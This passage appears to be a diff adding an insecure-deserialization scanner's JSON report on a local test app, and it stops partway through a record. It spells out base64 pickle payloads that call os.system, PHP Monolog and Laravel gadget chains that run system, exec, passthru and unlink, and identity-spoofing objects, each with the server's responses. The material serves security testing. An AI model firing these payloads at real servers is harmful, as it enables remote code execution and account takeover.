+      "url": "http://localhost:8083/api/import",
+      "method": "POST",
+      "location": "raw_body",
+      "name": "payload",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0005 \u0000\u0000\u0000\u0000\u0000\u0000\u0000}(\u0005theme\u0004dark\u0004lang\u0002enu."
+      ],
+      "mutations_count": 3,
+      "indicators": [
+        "Observation: response length changed by -30 bytes (baseline=62 mutated=32, same status 200) — possible behavioral change, verify manually"
+      ],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "weak",
+          "indicators": [
+            "Observation: response length changed by -30 bytes (baseline=62 mutated=32, same status 200) — possible behavioral change, verify manually"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 32,
+            "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "weak",
+          "indicators": [
+            "Observation: response length changed by -30 bytes (baseline=62 mutated=32, same status 200) — possible behavioral change, verify manually"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 32,
+            "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "weak",
+          "indicators": [
+            "Observation: response length changed by -30 bytes (baseline=62 mutated=32, same status 200) — possible behavioral change, verify manually"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 32,
+            "body_sample": "{\"restored\":\"0\",\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/import-config",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [
+        "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6c3a90>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb050>\",\"success\":true}\\n')",
+        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6c3a90>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb050>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6c3a90>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb050>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6c9950>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6c9f10>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.96) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6c9950>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6c9f10>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.99) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6cbd90>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cbed0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cbd90>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cbed0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6cad10>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb710>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cad10>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb710>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb7d0>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb890>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb7d0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb890>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb650>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cbed0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb650>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cbed0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6c94d0>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6ca650>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6c94d0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6ca650>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb0d0>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cae50>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb0d0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cae50>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6ca750>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6ca110>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.96) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6ca750>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6ca110>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb0d0>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb910>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb0d0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb910>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6cba90>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6cb0d0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cba90>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6cb0d0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.93) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9ccd80d0>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9d6c9a50>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9ccd80d0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6c9a50>\",\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/import-config",
+      "method": "POST",
+      "location": "cookie",
+      "name": "session",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0004:\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b__main__\u0004User)}(\busername\u0006wiener\u0005adminub."
+      ],
+      "mutations_count": 3,
+      "indicators": [
+        "Response content differs in a small, localized way despite same status (similarity=0.95) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6c9010>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9ccd99d0>\",\"success\":true}\\n')",
+        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.95) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9d6c9010>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9ccd99d0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9d6c9010>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9ccd99d0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9ccd8810>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9ccd9ad0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9ccd8810>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9ccd9ad0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"config\":\"<__main__.Settings object at 0x79bf9ccd9150>\",\"success\":true}\\n' mutated='{\"config\":\"<__main__.Settings object at 0x79bf9ccd8810>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9ccd9150>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 73,
+            "body_sample": "{\"config\":\"<__main__.Settings object at 0x79bf9ccd8810>\",\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/restore-prefs",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [
+        "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6ca9d0>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda0d0>\",\"success\":true}\\n')",
+        "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.96) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.96) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9d6ca9d0>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda0d0>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.96) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9d6ca9d0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda0d0>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9ad0>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda310>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd9ad0>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda310>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status (similarity=0.97) (baseline='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda410>\",\"success\":true}\\n' mutated='{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd8510>\",\"success\":true}\\n')",
+            "Control probe (non-serialized junk) returned the same status 200 and a near-identical body (similarity=0.97) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccda410>\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 78,
+            "body_sample": "{\"restored\":\"<__main__.Preferences object at 0x79bf9ccd8510>\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [
